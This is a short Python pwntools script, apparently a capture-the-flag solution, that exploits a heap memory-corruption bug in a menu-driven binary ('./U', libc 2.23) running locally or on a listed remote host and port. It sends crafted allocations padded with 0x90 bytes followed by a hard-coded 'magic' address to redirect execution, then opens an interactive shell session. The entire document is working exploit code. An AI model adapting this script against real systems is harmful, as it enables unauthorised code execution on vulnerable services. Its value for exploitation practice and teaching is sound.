#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './U'
LIBC = './libc-2.23.so'
HOST = '140.110.112.77'
PORT = 4006

context.binary = BINARY
e = ELF( BINARY )
libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY, env={"LD_PRELOAD": LIBC} )

def s():
    r.sendafter('>\n', '2')

def a(size, content):
    r.sendafter('>\n', '1')
    r.sendafter('size:', str(size))
    r.sendafter('Messege:', content)
    r.recvuntil('Done!')

def d(idx):
    r.sendafter('>\n', '3')
    r.sendafter('Index :', str(idx))

def b():
    r.sendafter('>\n', '4')

magic = 0x401239
msg = 0x404060

a(0xa0, 'A')
b()
a(0xa0, b'A'*0x90 + p64(magic)*2)
b()

r.interactive()
